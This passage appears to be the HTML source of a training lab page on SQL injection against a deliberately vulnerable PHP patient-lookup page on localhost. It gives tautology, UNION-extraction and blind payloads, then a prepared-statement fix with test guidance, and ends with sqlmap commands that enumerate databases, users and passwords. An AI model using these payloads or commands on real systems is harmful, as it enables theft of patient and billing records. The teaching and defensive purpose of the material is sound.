&lt;code&gt;&lt;?php echo htmlspecialchars($sql); ?&gt;&lt;/code&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/p&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;/div&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysqli_close($conn);</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-why-this-is-vulnerable-brief">2) Why this is vulnerable (brief)<a href="#2-why-this-is-vulnerable-brief" class="hash-link" aria-label="Direct link to 2) Why this is vulnerable (brief)" title="Direct link to 2) Why this is vulnerable (brief)" translate="no">​</a></h2>
+<ul>
+<li>The script builds an SQL string by directly inserting the q parameter into the query (WHERE first_name LIKE &#x27;%$q%&#x27; ...).</li>
+<li>An attacker can inject characters (quotes, SQL keywords) that change the structure of the query.</li>
+<li>Because the application echoes the constructed SQL (debug), students can clearly see how payloads map to the executed query — useful for learning.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-step-by-step-exploitation">3) Step-by-step exploitation<a href="#3-step-by-step-exploitation" class="hash-link" aria-label="Direct link to 3) Step-by-step exploitation" title="Direct link to 3) Step-by-step exploitation" translate="no">​</a></h2>
+<blockquote>
+<p>Perform these steps only in the lab environment described in Setup.</p>
+</blockquote>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-0--pre-check">Step 0 — Pre-check<a href="#step-0--pre-check" class="hash-link" aria-label="Direct link to Step 0 — Pre-check" title="Direct link to Step 0 — Pre-check" translate="no">​</a></h3>
+<ul>
+<li>Ensure hospital_emr has sample data (patients &amp; billing) inserted.</li>
+<li>Visit vulnerable page, e.g.:
+<a href="http://127.0.0.1:8080/patient_lookup.php?q=John" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8080/patient_lookup.php?q=John</a>
+You should see only matching rows for John.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-1--basic-tautology-discover-behavior--get-many-rows">Step 1 — Basic tautology (discover behavior / get many rows)<a href="#step-1--basic-tautology-discover-behavior--get-many-rows" class="hash-link" aria-label="Direct link to Step 1 — Basic tautology (discover behavior / get many rows)" title="Direct link to Step 1 — Basic tautology (discover behavior / get many rows)" translate="no">​</a></h3>
+<p>Payload (in the search box):</p>
+<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></span></code></pre></div></div>
+<p><strong>What to do:</strong></p>
+<ul>
+<li>Enter the payload and submit.</li>
+</ul>
+<p><strong>Expected effect:</strong></p>
+<ul>
+<li>The WHERE clause becomes effectively always true → many or all patient rows are returned (limited by LIMIT 100).</li>
+<li>Useful to show how simple input can bypass intended filters.</li>
+</ul>
+<p>Why it works (example):
+The query becomes (conceptually):</p>
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> first_name </span><span class="token operator" style="color:#393A34">LIKE</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token operator" style="color:#393A34">%</span><span class="token string" style="color:#e3116c">&#x27; OR last_name LIKE &#x27;</span><span class="token operator" style="color:#393A34">%</span><span class="token string" style="color:#e3116c">&#x27; OR &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;%&#x27;</span><br></span></code></pre></div></div>
+<ul>
+<li>This results in a tautology, returning many rows.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-2--examine-server-side-sql-mapping">Step 2 — Examine server-side SQL (mapping)<a href="#step-2--examine-server-side-sql-mapping" class="hash-link" aria-label="Direct link to Step 2 — Examine server-side SQL (mapping)" title="Direct link to Step 2 — Examine server-side SQL (mapping)" translate="no">​</a></h3>
+<ul>
+<li>Look at the Debug: the SQL executed... block printed on the page.</li>
+<li>Observe how your input was interpolated — this helps craft subsequent payloads.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-3--union-based-data-extraction-in-band-sqli">Step 3 — Union-based data extraction (in-band SQLi)<a href="#step-3--union-based-data-extraction-in-band-sqli" class="hash-link" aria-label="Direct link to Step 3 — Union-based data extraction (in-band SQLi)" title="Direct link to Step 3 — Union-based data extraction (in-band SQLi)" translate="no">​</a></h3>
+<p><strong>Goal:</strong> extract additional rows/columns (e.g., billing, other tables).</p>
+<p><strong>Important:</strong> The vulnerable query returns 6 columns (id, medical_record_number, first_name, last_name, dob, email). Any UNION SELECT must return the same number of columns and compatible types (or use fillers).</p>
+<p><strong>Example payload (search box):</strong></p>
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27; </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> medical_record_number</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> first_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> last_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dob</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> email </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> patients </span><span class="token comment" style="color:#999988;font-style:italic">-- </span><br></span></code></pre></div></div>
+<p><strong>Notes:</strong></p>
+<ul>
+<li>The leading single quote closes the literal; UNION SELECT ... appends rows.</li>
+<li>-- comments out the rest of the original query.</li>
+<li>If the page displays rows from patients, the UNION succeeded.</li>
+</ul>
+<p>Extracting billing info (map billing columns into the 6 display columns):</p>
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; UNION SELECT id, CONCAT(&#x27;</span><span class="token plain">BILL</span><span class="token comment" style="color:#999988;font-style:italic">#&#x27;,id), amount, currency, status, description FROM billing -- </span><br></span></code></pre></div></div>
+<p><strong>Result:</strong> Billing rows appear in the patients table display — demonstrating exfiltration to a UI that wasn&#x27;t intended to show billing.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-4--blind-techniques-when-errors-suppressed">Step 4 — Blind techniques (when errors suppressed)<a href="#step-4--blind-techniques-when-errors-suppressed" class="hash-link" aria-label="Direct link to Step 4 — Blind techniques (when errors suppressed)" title="Direct link to Step 4 — Blind techniques (when errors suppressed)" translate="no">​</a></h3>
+<p>If the app does not reveal SQL errors or you cannot use UNION, use blind methods:</p>
+<p><strong>Boolean-based example:</strong> check whether first letter of database version is &#x27;5&#x27;</p>
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND (SELECT SUBSTRING(VERSION(),1,1))=&#x27;</span><span class="token number" style="color:#36acaa">5</span><span class="token plain">&#x27; </span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
+<ul>
+<li>Observe whether response changes (true/false) to infer values character by character.</li>
+</ul>
+<p>Time-based example (MySQL):</p>
+<ul>
+<li>If the response is delayed, the tested condition is true.</li>
+</ul>
+<blockquote>
+<p>Blind techniques are slower but powerful when output is limited.</p>
+</blockquote>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-5--oob-out-of-band-exfiltration-advanced--optional">Step 5 — OOB (Out-of-band) exfiltration (advanced / optional)<a href="#step-5--oob-out-of-band-exfiltration-advanced--optional" class="hash-link" aria-label="Direct link to Step 5 — OOB (Out-of-band) exfiltration (advanced / optional)" title="Direct link to Step 5 — OOB (Out-of-band) exfiltration (advanced / optional)" translate="no">​</a></h3>
+<p>If direct responses are blocked but the database can make network calls (rare in default MySQL), use features (e.g., LOAD_FILE, OUTFILE, or DB-specific UDFs) or cause DNS/HTTP callbacks to an attacker-controlled server. Do not perform network exfiltration on shared lab networks. This is only for advanced/simulated labs.</p>
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl &quot;http://127.0.0.1:8080/patient_lookup.php?q=%27+UNION+SELECT+1%2C+medical_record_number%2C+first_name%2C+last_name%2C+dob%2C+email+FROM+patients+--+&quot;</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="common-pitfalls--hints-for-students">Common pitfalls &amp; hints for students<a href="#common-pitfalls--hints-for-students" class="hash-link" aria-label="Direct link to Common pitfalls &amp; hints for students" title="Direct link to Common pitfalls &amp; hints for students" translate="no">​</a></h2>
+<ul>
+<li>Column count mismatch: If your UNION SELECT has the wrong number of columns, DB returns an error. Use ORDER BY n or trial NULL fillers (e.g., NULL, NULL) to find correct count.</li>
+<li>Data types: If a column expects number but you provide text, use type-compatible values (e.g., use 1 for numeric id columns or wrap strings in quotes).</li>
+<li>LIMIT hiding data: LIMIT 100 can hide rows; attack may need multiple queries or remove LIMIT via comment injection if possible.</li>
+<li>Escaped characters / filters: If the app escapes quotes or filters keywords, try alternative encodings or blind/time-based techniques.</li>
+<li>WAFs / detection: Basic WAFs may block naive payloads — teach how WAFs raise alerts and also how attackers try to evade them (but emphasize defenders should tune WAFs and monitoring).</li>
+</ul>
+<h1>Secure Implementation — Patient Lookup (Fixed)</h1>
+<blockquote>
+<p><strong>File:</strong> <code>patient_lookup_fixed.php</code><br>
+<!-- -->The file above is the fixed now you have to test the differences.</p>
+</blockquote>
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// patient_lookup_fixed.php - safe version using prepared statements</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_HOST = &#x27;hostname&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_USER = &#x27;username&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_PASS = &#x27;password&#x27;;         // set your password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_NAME = &#x27;dbname&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_PORT = 3306;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (!$conn) die(&quot;DB connection error.&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$q = isset($_GET[&#x27;q&#x27;]) ? trim($_GET[&#x27;q&#x27;]) : &#x27;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Use prepared statement and bind parameter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$sql = &quot;SELECT id, medical_record_number, first_name, last_name, dob, email</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        FROM patients</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WHERE first_name LIKE CONCAT(&#x27;%&#x27;, ?, &#x27;%&#x27;) OR last_name LIKE CONCAT(&#x27;%&#x27;, ?, &#x27;%&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        LIMIT 100&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stmt = mysqli_prepare($conn, $sql);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($stmt) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $q, $q);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mysqli_stmt_execute($stmt);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $res = mysqli_stmt_get_result($stmt);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">} else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(&quot;Prepare failed.&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Patient Lookup (Fixed)&lt;/title&gt;&lt;/head&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;h2&gt;Patient Lookup (FIXED)&lt;/h2&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;form&gt;&lt;input name=&quot;q&quot; value=&quot;&lt;?php echo htmlspecialchars($q); ?&gt;&quot; /&gt;&lt;button&gt;Search&lt;/button&gt;&lt;/form&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;table border=&quot;1&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;MRN&lt;/th&gt;&lt;th&gt;First&lt;/th&gt;&lt;th&gt;Last&lt;/th&gt;&lt;th&gt;DOB&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;?php while ($row = mysqli_fetch_assoc($res)): ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;id&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;medical_record_number&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;first_name&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;last_name&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;dob&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;email&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;/tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;?php endwhile; ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;/table&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/body&gt;&lt;/html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php mysqli_close($conn); ?&gt;</span><br></span></code></pre></div></div>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="core-security-changes-high-level">Core security changes (high level)<a href="#core-security-changes-high-level" class="hash-link" aria-label="Direct link to Core security changes (high level)" title="Direct link to Core security changes (high level)" translate="no">​</a></h2>
+<ol>
+<li>
+<p><strong>Use of Prepared Statements / Parameterized Queries</strong></p>
+<ul>
+<li>The fixed implementation uses prepared statements (e.g., <code>mysqli_prepare()</code> / <code>PDO::prepare()</code>), binding user input as parameters instead of concatenating it into the SQL string.</li>
+<li><strong>Why it helps:</strong> Bound parameters are treated strictly as data — they cannot change the SQL syntax — which eliminates SQL Injection vectors.</li>
+</ul>
+</li>
+<li>
+<p><strong>Safer <code>LIKE</code> usage with parameters</strong></p>
+<ul>
+<li>Instead of building <code>&#x27;%$q%&#x27;</code> directly into SQL, the implementation uses <code>CONCAT(&#x27;%&#x27;, ?, &#x27;%&#x27;)</code> (or binds <code>&#x27;%&#x27;.$q.&#x27;%&#x27;</code> as a parameter depending on the API) so the wildcard logic stays data-bound.</li>
+<li><strong>Why it helps:</strong> Prevents attackers from injecting quotes or <code>UNION</code> constructs inside the <code>LIKE</code> expression.</li>
+</ul>
+</li>
+<li>
+<p><strong>Input normalization &amp; basic validation</strong></p>
+<ul>
+<li>Trim input, enforce a reasonable maximum length, and optionally restrict characters (e.g., block control characters). Use whitelist validation where applicable.</li>
+<li><strong>Why it helps:</strong> Limits attacker-controlled input size and avoids unexpected characters that may make exploitation easier or cause DoS.</li>
+</ul>
+</li>
+<li>
+<p><strong>Least-privilege DB account</strong></p>
+<ul>
+<li>The application uses a database user with only the permissions necessary (e.g., <code>SELECT</code> on specific columns/tables) rather than a high-privilege <code>root</code> account.</li>
+<li><strong>Why it helps:</strong> Even if SQLi were present, the attacker’s ability to read or modify data would be constrained by DB permissions.</li>
+</ul>
+</li>
+<li>
+<p><strong>Remove or avoid debug SQL exposure</strong></p>
+<ul>
+<li>The fixed version does <strong>not</strong> print the full interpolated SQL to the page. Debugging information is logged to server-side logs (with redaction) when needed, not echoed to clients.</li>
+<li><strong>Why it helps:</strong> Avoids giving attackers direct insight into query structure and helps prevent information leakage.</li>
+</ul>
+</li>
+<li>
+<p><strong>Safe error handling &amp; logging</strong></p>
+<ul>
+<li>Catch/handle DB errors gracefully. Return user-friendly messages (e.g., “No results found”) and write detailed errors to server logs that are protected and redacted for PHI.</li>
+<li><strong>Why it helps:</strong> Prevents error-based injection discovery and protects sensitive data from being logged in plain text.</li>
+</ul>
+</li>
+<li>
+<p><strong>Limit returned columns &amp; pagination</strong></p>
+<ul>
+<li>Query only the columns required for the view (avoid <code>SELECT *</code>). Keep <code>LIMIT</code> and add pagination controls to restrict bulk exfiltration in normal operation.</li>
+<li><strong>Why it helps:</strong> Reduces attack surface and the amount of data an attacker can retrieve in one query.</li>
+</ul>
+</li>
+<li>
+<p><strong>Monitoring &amp; alerting hooks</strong></p>
+<ul>
+<li>Add server-side checks to log anomalous query patterns (large result sets, repeated unusual parameters) and integrate with DB activity monitoring or WAF telemetry.</li>
+<li><strong>Why it helps:</strong> Improves detection of attempted exploits and enables faster incident response.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-to-test-after-deploying-the-fixed-code">What to test after deploying the fixed code<a href="#what-to-test-after-deploying-the-fixed-code" class="hash-link" aria-label="Direct link to What to test after deploying the fixed code" title="Direct link to What to test after deploying the fixed code" translate="no">​</a></h2>
+<ol>
+<li>
+<p><strong>Functionality tests</strong></p>
+<ul>
+<li>Normal searches (e.g., <code>John</code>, <code>Jane</code>) still return expected results.</li>
+<li>Pagination and result limits behave correctly.</li>
+</ul>
+</li>
+<li>
+<p><strong>Security tests (lab environment)</strong></p>
+<ul>
+<li>Re-run the earlier SQLi payloads used against the vulnerable page (e.g., <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code>, <code>UNION SELECT ...</code>) and confirm they <strong>no longer</strong> modify query logic or return unexpected rows.</li>
+<li>Test blind/time-based payloads; responses should not change to reveal data.</li>
+<li>Confirm that supplying very long input strings is handled (max length enforced).</li>
+</ul>
+</li>
+<li>
+<p><strong>Error handling &amp; logging</strong></p>
+<ul>
+<li>Trigger a controlled DB error (in a safe way) and confirm the user-facing message is generic while the detailed error is written to a protected log (with no PHI).</li>
+</ul>
+</li>
+<li>
+<p><strong>Permission validation</strong></p>
+<ul>
+<li>Verify the DB user used by the application cannot perform actions beyond its needs (no <code>DROP</code>, <code>INSERT</code>, <code>UPDATE</code> if not required).</li>
+<li>Attempt queries that would require elevated privileges and confirm they fail with permission errors for the app user.</li>
+</ul>
+</li>
+<li>
+<p><strong>Regression checks</strong></p>
+<ul>
+<li>Ensure the fixed code still meets performance expectations and does not introduce latency when binding parameters.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h1>SQLMap Lab — Automated SQL Injection with <code>sqlmap</code></h1>
+<p>This section shows how to use <strong>sqlmap</strong> to discover and exploit the SQL Injection vulnerability in the vulnerable <code>patient_lookup.php</code> lab page.<br>
+<!-- -->It starts from installation, moves to discovery, enumeration, targeted extraction (patients &amp; billing), and concludes with guidance on interpreting results and safe practices.</p>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="lab-assumptions--target">Lab assumptions &amp; target<a href="#lab-assumptions--target" class="hash-link" aria-label="Direct link to Lab assumptions &amp; target" title="Direct link to Lab assumptions &amp; target" translate="no">​</a></h2>
+<ul>
+<li>Vulnerable page (lab): <code>http://127.0.0.1:8080/patient_lookup.php?q=John</code></li>
+<li>Database: <code>hospital_emr</code> (schema and sample data already prepared in the <strong>Setup</strong> page)</li>
+<li>You run commands on the lab host (Linux/macOS/Windows WSL) with <code>python3</code> and <code>pip</code> available.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1--install-sqlmap">1 — Install sqlmap<a href="#1--install-sqlmap" class="hash-link" aria-label="Direct link to 1 — Install sqlmap" title="Direct link to 1 — Install sqlmap" translate="no">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="option-a--via-pip-portable">Option A — via <code>pip</code> (portable)<a href="#option-a--via-pip-portable" class="hash-link" aria-label="Direct link to option-a--via-pip-portable" title="Direct link to option-a--via-pip-portable" translate="no">​</a></h3>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m pip install --user sqlmap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># ensure ~/.local/bin is in PATH if installed with --user</span><br></span></code></pre></div></div>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="option-b--clone-latest-from-github-recommended-for-newest-features">Option B — clone latest from GitHub (recommended for newest features)<a href="#option-b--clone-latest-from-github-recommended-for-newest-features" class="hash-link" aria-label="Direct link to Option B — clone latest from GitHub (recommended for newest features)" title="Direct link to Option B — clone latest from GitHub (recommended for newest features)" translate="no">​</a></h3>
+<div class="language-bach codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bach codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd sqlmap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># run via: python3 sqlmap.py ...</span><br></span></code></pre></div></div>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2--safe-discovery-non-destructive">2 — Safe discovery (non-destructive)<a href="#2--safe-discovery-non-destructive" class="hash-link" aria-label="Direct link to 2 — Safe discovery (non-destructive)" title="Direct link to 2 — Safe discovery (non-destructive)" translate="no">​</a></h2>
+<p>Start with a low-risk check to see if q is injectable (no dumping):</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=John&quot; --batch --level=1 --risk=1 --technique=BE --threads=2</span><br></span></code></pre></div></div>
+<ul>
+<li>--level / --risk control intensity (begin low).</li>
+<li>--technique=BE limits checks to Boolean &amp; Error types.</li>
+<li>--batch auto-answers prompts for automation.</li>
+</ul>
+<p><strong>Expected:</strong> sqlmap reports whether it found an injectable parameter and which technique succeeded.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3--force-probing-the-q-parameter">3 — Force probing the q parameter<a href="#3--force-probing-the-q-parameter" class="hash-link" aria-label="Direct link to 3 — Force probing the q parameter" title="Direct link to 3 — Force probing the q parameter" translate="no">​</a></h2>
+<p>Let sqlmap probe the q parameter explicitly:</p>
+<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://127.0.0.1:8080/patient_lookup.php?q=*&quot; --batch --level=2 --risk=1</span><br></span></code></pre></div></div>
+<ul>
+<li>Use q=* to instruct sqlmap to test that parameter.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="4--enumerate-databases--users">4 — Enumerate databases / users<a href="#4--enumerate-databases--users" class="hash-link" aria-label="Direct link to 4 — Enumerate databases / users" title="Direct link to 4 — Enumerate databases / users" translate="no">​</a></h2>
+<p>Once injection is confirmed, enumerate DBs and users:</p>
+<ul>
+<li>sqlmap -u &quot;<a href="http://127.0.0.1:8080/patient_lookup.php?q=" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8080/patient_lookup.php?q=</a>*&quot; --dbs --batch</li>
+<li>sqlmap -u &quot;<a href="http://127.0.0.1:8080/patient_lookup.php?q=" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8080/patient_lookup.php?q=</a>*&quot; --current-db --batch</li>
+<li>sqlmap -u &quot;<a href="http://127.0.0.1:8080/patient_lookup.php?q=" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8080/patient_lookup.php?q=</a>*&quot; --users --passwords --batch</li>
+</ul>
+<p><strong>Goal:</strong> confirm hospital_emr exists and inspect DB users (lab only).</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="5--list-tables-in-hospital_emr">5 — List tables in hospital_emr<a href="#5--list-tables-in-hospital_emr" class="hash-link" aria-label="Direct link to 5 — List tables in hospital_emr" title="Direct link to 5 — List tables in hospital_emr" translate="no">​</a></h2>
